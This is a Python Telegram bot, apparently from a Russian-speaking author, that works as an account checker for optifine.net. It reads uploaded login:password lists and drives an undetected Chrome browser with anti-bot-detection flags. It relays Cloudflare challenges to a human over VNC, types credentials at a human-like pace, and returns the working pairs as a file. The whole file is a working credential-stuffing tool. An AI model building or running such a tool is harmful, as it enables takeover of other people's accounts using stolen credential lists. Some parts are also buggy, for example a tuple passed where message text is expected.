import os
import sys
import logging
import asyncio
import aiofiles
import time
import random
import subprocess
from datetime import datetime
from typing import Dict, List, Tuple

import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('/app/debug/bot.log')
    ]
)
logger = logging.getLogger(__name__)

# Конфиг
TOKEN = os.environ.get('BOT_TOKEN')
if not TOKEN:
    print("❌ НЕТ ТОКЕНА!")
    sys.exit(1)

ADMIN_IDS = os.environ.get('ADMIN_IDS', '').split(',')
ADMIN_IDS = [int(id.strip()) for id in ADMIN_IDS if id.strip()]
ALLOWED_USERS = ADMIN_IDS.copy() if ADMIN_IDS else []

# Статистика
bot_stats = {
    'total': 0,
    'valid': 0,
    'invalid': 0,
    'start_time': datetime.now()
}

# Хранилище сессий
active_sessions = {}

# Создаем директории
os.makedirs('/app/debug', exist_ok=True)
os.makedirs('/app/sessions', exist_ok=True)

class OptifineChecker:
    def __init__(self):
        self.driver = None
        self.cloudflare_passed = False
        logger.info("🚀 Инициализация OptifineChecker...")
    
    def wait_for_xvfb(self):
        """Ждет готовности Xvfb"""
        for i in range(10):
            try:
                result = subprocess.run(['xdpyinfo', '-display', ':99'], 
                                      capture_output=True, timeout=2)
                if result.returncode == 0:
                    logger.info("✅ Xvfb готов")
                    return True
            except:
                pass
            logger.info(f"⏳ Ожидание Xvfb... {i+1}/10")
            time.sleep(2)
        return False

    def init_driver(self):
        """Инициализация драйвера"""
        try:
            if not self.wait_for_xvfb():
                logger.error("❌ Xvfb не запустился")
                return False
            
            logger.info("🔍 Определяю версию Chrome...")
            
            try:
                chrome_version_output = subprocess.check_output(['google-chrome', '--version']).decode().strip()
                chrome_version = chrome_version_output.split(' ')[-1].split('.')[0]
                logger.info(f"✅ Обнаружена версия Chrome: {chrome_version}")
            except:
                chrome_version = 145
                logger.warning(f"⚠️ Использую версию по умолчанию: {chrome_version}")
            
            options = uc.ChromeOptions()
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--window-size=1920,1080')
            options.add_argument('--start-maximized')
            options.add_argument('--disable-gpu')
            options.add_argument('--disable-blink-features=AutomationControlled')
            options.add_argument('--lang=en-US,en;q=0.9')
            options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36')
            options.add_argument('--ignore-certificate-errors')
            options.add_argument('--ignore-ssl-errors')
            
            logger.info(f"🚀 Запускаю undetected_chromedriver...")
            
            self.driver = uc.Chrome(
                options=options,
                version_main=int(chrome_version),
                headless=False
            )
            
            self.driver.set_page_load_timeout(60)
            self.driver.implicitly_wait(10)
            
            logger.info("✅ Драйвер успешно инициализирован")
            return True
            
        except Exception as e:
            logger.error(f"❌ Ошибка инициализации: {e}")
            return False

    def check_cloudflare_status(self):
        """Проверяет статус Cloudflare"""
        try:
            current_url = self.driver.current_url
            page_title = self.driver.title.lower()
            page_source = self.driver.page_source
            
            if 'just a moment' in page_title:
                return False
            if 'cf-chl-widget' in page_source or 'turnstile' in page_source:
                return False
            
            inputs = self.driver.find_elements(By.TAG_NAME, "input")
            visible_inputs = [i for i in inputs if i.is_displayed() and 
                             i.get_attribute('type') not in ['hidden']]
            
            if len(visible_inputs) >= 1:
                logger.info("✅ Cloudflare пройден!")
                return True
            
            return False
            
        except Exception as e:
            logger.error(f"❌ Ошибка проверки: {e}")
            return False

    async def setup_vnc_access(self, update, context):
        """Настраивает VNC доступ"""
        try:
            session_id = f"{update.effective_user.id}_{int(time.time())}"
            
            # Получаем IP адрес
            public_ip = None
            try:
                result = subprocess.run(['curl', '-s', 'ifconfig.me'], 
                                      capture_output=True, text=True, timeout=5)
                public_ip = result.stdout.strip()
            except:
                pass
            
            # Получаем Railway URL (если есть)
            railway_url = None
            try:
                railway_host = os.environ.get('RAILWAY_PUBLIC_DOMAIN')
                if railway_host:
                    railway_url = f"{railway_host}:5900"
            except:
                pass
            
            keyboard = [
                [InlineKeyboardButton("✅ Я нажал галочку", callback_data=f"vnc_done_{session_id}")],
                [InlineKeyboardButton("🔄 Проверить статус", callback_data=f"vnc_status_{session_id}")],
                [InlineKeyboardButton("❌ Отмена", callback_data=f"vnc_cancel_{session_id}")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            # Формируем инструкцию
            if railway_url:
                instruction = (
                    f"🖥️ **ПОДКЛЮЧЕНИЕ К БРАУЗЕРУ**\n\n"
                    f"🔗 **АДРЕС ДЛЯ ПОДКЛЮЧЕНИЯ:**\n"
                    f"`{railway_url}`\n\n"
                    f"📱 **НА ТЕЛЕФОНЕ:**\n"
                    f"1. Скачай **VNC Viewer** из магазина приложений\n"
                    f"2. Нажми + и введи адрес выше\n"
                    f"3. Нажми Connect\n\n"
                    f"✅ **ЧТО ДЕЛАТЬ:**\n"
                    f"• Нажми галочку в браузере\n"
                    f"• Вернись и нажми кнопку\n\n"
                    f"⏳ **Жду 5 минут...**"
                )
            elif public_ip:
                instruction = (
                    f"🖥️ **ПОДКЛЮЧЕНИЕ К БРАУЗЕРУ**\n\n"
                    f"🔗 **АДРЕС ДЛЯ ПОДКЛЮЧЕНИЯ:**\n"
                    f"`{public_ip}:5900`\n\n"
                    f"⚠️ **Важно:** Убедись что порт 5900 открыт в Railway:\n"
                    f"Settings → Networking → Add Port 5900\n\n"
                    f"📱 **Инструкция в VNC Viewer:**\n"
                    f"1. Введи адрес: `{public_ip}:5900`\n"
                    f"2. Нажми Connect\n\n"
                    f"✅ **ДЕЙСТВИЯ:**\n"
                    f"• Нажми галочку в браузере\n"
                    f"• Вернись и нажми кнопку",
                    reply_markup=reply_markup
                )
            else:
                instruction = (
                    f"🖥️ **НАСТРОЙКА VNC ДОСТУПА**\n\n"
                    f"1️⃣ **Зайди в Railway Dashboard**\n"
                    f"2️⃣ **Открой Settings → Networking**\n"
                    f"3️⃣ **Добавь порт 5900 (TCP)**\n"
                    f"4️⃣ **Скопируй публичный адрес**\n\n"
                    f"5️⃣ **Скачай VNC Viewer** на телефон\n"
                    f"6️⃣ **Введи скопированный адрес**\n"
                    f"7️⃣ **Нажми Connect**\n\n"
                    f"8️⃣ **Нажми галочку** в браузере\n"
                    f"9️⃣ **Вернись и нажми кнопку**",
                    reply_markup=reply_markup
                )
            
            await update.message.reply_text(instruction, reply_markup=reply_markup)
            
            # Открываем страницу
            self.driver.get("https://optifine.net/login")
            
            # Сохраняем сессию
            active_sessions[session_id] = {
                'user_id': update.effective_user.id,
                'checker': self,
                'start_time': time.time()
            }
            
            return True
            
        except Exception as e:
            logger.error(f"❌ Ошибка VNC: {e}")
            await update.message.reply_text(f"❌ Ошибка: {e}")
            return False

    async def handle_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Обрабатывает нажатия кнопок"""
        query = update.callback_query
        await query.answer()
        
        data = query.data
        if not data.startswith('vnc_'):
            return
        
        parts = data.split('_')
        action = parts[1]
        session_id = parts[2] if len(parts) > 2 else None
        
        if session_id not in active_sessions:
            await query.edit_message_text("❌ Сессия устарела")
            return
        
        session = active_sessions[session_id]
        
        if query.from_user.id != session['user_id']:
            await query.answer("❌ Это не ваша сессия!", show_alert=True)
            return
        
        if action == 'done':
            if session['checker'].check_cloudflare_status():
                session['checker'].cloudflare_passed = True
                await query.edit_message_text("✅ **Cloudflare пройден!** Продолжаю проверку...")
            else:
                await query.edit_message_text(
                    "❌ **Cloudflare все еще активен**\n\n"
                    "Посмотри в VNC и нажми галочку"
                )
        
        elif action == 'status':
            if session['checker'].check_cloudflare_status():
                session['checker'].cloudflare_passed = True
                await query.edit_message_text("✅ **Cloudflare пройден!**")
            else:
                await query.edit_message_text("⏳ **Cloudflare еще активен**")
        
        elif action == 'cancel':
            await query.edit_message_text("❌ Операция отменена")
            del active_sessions[session_id]

    async def check_account(self, login: str, password: str) -> Dict:
        """Проверка аккаунта"""
        logger.info(f"🔍 Проверяю: {login[:20]}...")
        
        if not self.driver:
            return {'login': login, 'status': 'error', 'error': 'Драйвер не инициализирован'}
        
        try:
            # Ждем прохождения Cloudflare
            timeout = 300
            start_time = time.time()
            
            while time.time() - start_time < timeout:
                if self.cloudflare_passed or self.check_cloudflare_status():
                    logger.info("✅ Cloudflare пройден")
                    break
                await asyncio.sleep(2)
            
            if not self.cloudflare_passed and not self.check_cloudflare_status():
                return {'login': login, 'status': 'error', 'error': 'Cloudflare не пройден'}
            
            # Поиск полей
            email_field = None
            password_field = None
            
            for _ in range(10):
                inputs = self.driver.find_elements(By.TAG_NAME, "input")
                for inp in inputs:
                    if inp.is_displayed():
                        input_type = inp.get_attribute('type')
                        if input_type in ['text', 'email']:
                            email_field = inp
                        elif input_type == 'password':
                            password_field = inp
                
                if email_field and password_field:
                    break
                await asyncio.sleep(1)
            
            if not email_field or not password_field:
                return {'login': login, 'status': 'error', 'error': 'Поля не найдены'}
            
            # Поиск кнопки
            submit_button = None
            buttons = self.driver.find_elements(By.TAG_NAME, "button")
            for btn in buttons:
                if btn.is_displayed() and ('login' in btn.text.lower() or 'sign' in btn.text.lower()):
                    submit_button = btn
                    break
            
            if not submit_button:
                return {'login': login, 'status': 'error', 'error': 'Кнопка не найдена'}
            
            # Ввод данных
            email_field.clear()
            for char in login:
                email_field.send_keys(char)
                time.sleep(0.03)
            
            time.sleep(0.5)
            
            password_field.clear()
            for char in password:
                password_field.send_keys(char)
                time.sleep(0.03)
            
            time.sleep(0.5)
            
            submit_button.click()
            time.sleep(5)
            
            # Проверка результата
            current_url = self.driver.current_url
            if 'downloads' in current_url or 'profile' in current_url:
                return {'login': login, 'password': password, 'status': 'valid'}
            else:
                return {'login': login, 'status': 'invalid', 'error': 'Неверный логин/пароль'}
            
        except Exception as e:
            logger.error(f"❌ Ошибка: {e}")
            return {'login': login, 'status': 'error', 'error': str(e)[:100]}

    def close(self):
        """Закрытие драйвера"""
        if self.driver:
            try:
                self.driver.quit()
                logger.info("✅ Драйвер закрыт")
            except:
                pass

# --- Telegram handlers ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Старт"""
    if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
        await update.message.reply_text("❌ **Нет доступа**")
        return
    
    await update.message.reply_text(
        "👋 **Optifine Checker с VNC доступом**\n\n"
        "📥 **Отправь .txt файл** с аккаунтами\n"
        "Формат: логин:пароль (каждый с новой строки)\n\n"
        "📌 **Пример:**\n"
        "`user@mail.com:password123`\n\n"
        "🔧 **Для админов:** /debug"
    )

async def debug_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Отправка файлов отладки"""
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ **Нет доступа**")
        return
    
    try:
        files = os.listdir('/app/debug')
        if not files:
            await update.message.reply_text("📁 Папка debug пуста")
            return
        
        files.sort(key=lambda x: os.path.getmtime(os.path.join('/app/debug', x)), reverse=True)
        
        sent = 0
        for file in files[:5]:
            file_path = os.path.join('/app/debug', file)
            if os.path.getsize(file_path) > 10 * 1024 * 1024:
                continue
            with open(file_path, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=file,
                    caption=f"📁 **Debug:** `{file}`"
                )
            sent += 1
            await asyncio.sleep(1)
        
        await update.message.reply_text(f"✅ Отправлено файлов: {sent}")
        
    except Exception as e:
        await update.message.reply_text(f"❌ Ошибка: {e}")

async def process_file(file_path, update, context):
    """Обработка файла"""
    checker = OptifineChecker()
    results = {'valid': [], 'invalid': [], 'errors': []}
    
    msg = await update.message.reply_text("🚀 **Запускаю проверку...**")
    
    try:
        # Читаем файл
        async with aiofiles.open(file_path, 'r', encoding='utf-8') as f:
            content = await f.read()
        
        # Парсим аккаунты
        accounts = []
        for line in content.strip().split('\n'):
            line = line.strip()
            if ':' in line:
                login, password = line.split(':', 1)
                accounts.append((login.strip(), password.strip()))
        
        total = len(accounts)
        if total == 0:
            await msg.edit_text("❌ **Нет аккаунтов**")
            return
        
        await msg.edit_text(f"📊 Аккаунтов: {total}\n\n🖥️ **Запускаю браузер...**")
        
        # Инициализация
        if not checker.init_driver():
            await msg.edit_text("❌ **Ошибка инициализации**")
            return
        
        # Настройка VNC
        success = await checker.setup_vnc_access(update, context)
        if not success:
            checker.close()
            return
        
        # Ожидание Cloudflare
        await msg.edit_text(f"⏳ **Ожидаю прохождения Cloudflare...**\n\nПодключись к VNC и нажми галочку")
        
        # Проверка аккаунтов
        valid_count = 0
        for i, (login, password) in enumerate(accounts, 1):
            if i % 3 == 0:
                await msg.edit_text(f"📊 Прогресс: {i}/{total}\n✅ Рабочих: {valid_count}")
            
            result = await checker.check_account(login, password)
            
            if result['status'] == 'valid':
                results['valid'].append(result)
                valid_count += 1
                bot_stats['valid'] += 1
            elif result['status'] == 'invalid':
                results['invalid'].append(result)
                bot_stats['invalid'] += 1
            else:
                results['errors'].append(result)
                bot_stats['invalid'] += 1
            
            bot_stats['total'] += 1
            await asyncio.sleep(2)
        
        # Отправка результатов
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        if results['valid']:
            valid_file = f"✅_РАБОЧИЕ_{len(results['valid'])}шт_{timestamp}.txt"
            async with aiofiles.open(valid_file, 'w') as f:
                for acc in results['valid']:
                    await f.write(f"{acc['login']}:{acc['password']}\n")
            with open(valid_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=valid_file,
                    caption=f"✅ **Рабочих: {len(results['valid'])}**"
                )
            os.remove(valid_file)
        
        await update.message.reply_text(
            f"✅ **ПРОВЕРКА ЗАВЕРШЕНА!**\n\n"
            f"📊 Всего: {total}\n"
            f"✅ Рабочих: {len(results['valid'])}\n"
            f"❌ Нерабочих: {len(results['invalid'])}"
        )
        
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await update.message.reply_text(f"❌ **Ошибка:** {str(e)[:100]}")
    finally:
        checker.close()
        if os.path.exists(file_path):
            os.remove(file_path)

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Получение файла"""
    if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
        await update.message.reply_text("❌ **Нет доступа**")
        return
    
    doc = update.message.document
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ **Нужен .txt файл**")
        return
    
    try:
        file = await context.bot.get_file(doc.file_id)
        path = f"temp_{update.effective_user.id}_{doc.file_name}"
        await file.download_to_drive(path)
        await process_file(path, update, context)
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await update.message.reply_text(f"❌ **Ошибка:** {str(e)[:100]}")

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработка кнопок"""
    checker = OptifineChecker()
    await checker.handle_callback(update, context)

def main():
    """Запуск"""
    print("=" * 50)
    print("🚀 ЗАПУСК OPTIFINE CHECKER (VNC РЕЖИМ)")
    print("=" * 50)
    
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("debug", debug_command))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    print("✅ БОТ ЗАПУЩЕН!")
    print("=" * 50)
    
    try:
        app.run_polling()
    except Exception as e:
        logger.error(f"Ошибка: {e}")

if __name__ == '__main__':
    main()